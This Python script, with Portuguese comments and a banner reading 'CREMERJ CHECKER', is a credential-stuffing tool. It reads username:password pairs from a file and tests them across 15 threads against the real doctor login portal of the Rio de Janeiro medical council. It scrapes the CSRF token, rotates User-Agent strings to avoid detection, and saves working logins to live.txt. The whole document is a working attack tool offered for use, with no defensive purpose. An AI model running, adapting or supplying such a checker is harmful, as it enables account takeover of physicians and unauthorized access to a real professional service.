import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
import os
import sys
import random

init(autoreset=True)

# Configurações
MAX_THREADS = 15
TIMEOUT = 10
LOGINS_FILE = "logins.txt"
LIVE_FILE = "live.txt"
DIE_FILE = "die.txt"
ERROR_FILE = "errors.txt"

# Contadores globais
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

# Gerar User-Agents aleatórios
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
   ___ ___ ___ ___ ___ ___ _____ 
  / __| _ \ __| _ \_ _/ __|_   _|
 | (__|   / _||   /| |\__ \ | |  
  \___|_|_\___|_|_\___|___/ |_|  
  """ + Style.RESET_ALL)
    print(Fore.YELLOW + " CREMERJ CHECKER - By: lushi" + Style.RESET_ALL)
    print(Fore.CYAN + "═" * 50 + Style.RESET_ALL)

def show_panel():
    elapsed = time.time() - stats['start_time']
    clear_screen()
    show_banner()
    print(f"{Fore.GREEN}✅ LIVE: {stats['live']}")
    print(f"{Fore.RED}❌ DIE: {stats['die']}")
    print(f"{Fore.YELLOW}⚠ ERROR: {stats['error']}")
    print(f"{Fore.CYAN}🔍 TOTAL: {stats['total']}")
    print(f"{Fore.BLUE}⏱ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "═" * 50 + Style.RESET_ALL)

def save_result(filename, content):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
    except Exception as e:
        print(Fore.RED + f"Erro ao salvar resultado: {e}")

def get_csrf_token(session):
    try:
        url = "https://www.cremerj.org.br/servicomedico/loginmedico/loginnovo"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": url
        }
        response = session.get(url, headers=headers, timeout=TIMEOUT)
        if '_csrf' in response.text:
            return response.text.split('name="_csrf" value="')[1].split('"')[0]
        return None
    except Exception:
        return None

def check_login(username, password):
    session = requests.Session()
    try:
        # Obter CSRF token
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            return "ERROR", "Falha ao obter CSRF token"

        # Configurar headers
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.cremerj.org.br",
            "Referer": "https://www.cremerj.org.br/servicomedico/loginmedico/loginnovo"
        }

        # Dados do formulário
        data = {
            "username": username,
            "password": password,
            "_csrf": csrf_token
        }

        # Enviar requisição
        response = session.post(
            "https://www.cremerj.org.br/servicomedico/loginmedico/loginnovo",
            headers=headers,
            data=data,
            timeout=TIMEOUT,
            allow_redirects=False
        )

        # Verificar resposta
        if response.status_code == 302 and "servicomedico" in response.headers.get('Location', ''):
            return "LIVE", None
        else:
            return "DIE", None

    except requests.exceptions.RequestException as e:
        return "ERROR", str(e)
    except Exception as e:
        return "ERROR", str(e)

def process_account(username, password):
    result, message = check_login(username, password)
    
    if result == "LIVE":
        stats['live'] += 1
        save_result(LIVE_FILE, f"{username}:{password}")
        return f"{Fore.GREEN}[+] LIVE | {username}:{password}"
    elif result == "DIE":
        stats['die'] += 1
        save_result(DIE_FILE, f"{username}:{password}")
        return f"{Fore.RED}[-] DIE | {username}:{password}"
    else:
        stats['error'] += 1
        save_result(ERROR_FILE, f"{username}:{password} | {message}")
        return f"{Fore.YELLOW}[!] ERROR | {username}:{password} | {message[:50]}"

def main():
    # Verificar arquivo de logins
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        sys.exit(1)

    # Carregar contas
    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line.strip()]
    except Exception as e:
        print(Fore.RED + f"Erro ao ler arquivo: {e}")
        sys.exit(1)

    stats['total'] = len(accounts)
    show_panel()

    # Processar contas
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            if len(acc) == 2:
                username, password = acc
                futures.append(executor.submit(process_account, username, password))

        for future in as_completed(futures):
            print(future.result())
            show_panel()

    # Resultado final
    print(Fore.CYAN + "\n═" * 50)
    print(Fore.GREEN + "VERIFICAÇÃO CONCLUÍDA!")
    print(Fore.CYAN + "═" * 50)
    print(Fore.GREEN + f"Contas válidas salvas em: {LIVE_FILE}")
    print(Fore.RED + f"Contas inválidas salvas em: {DIE_FILE}")
    print(Fore.YELLOW + f"Erros salvos em: {ERROR_FILE}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nInterrompido pelo usuário. Finalizando...")
        sys.exit(0)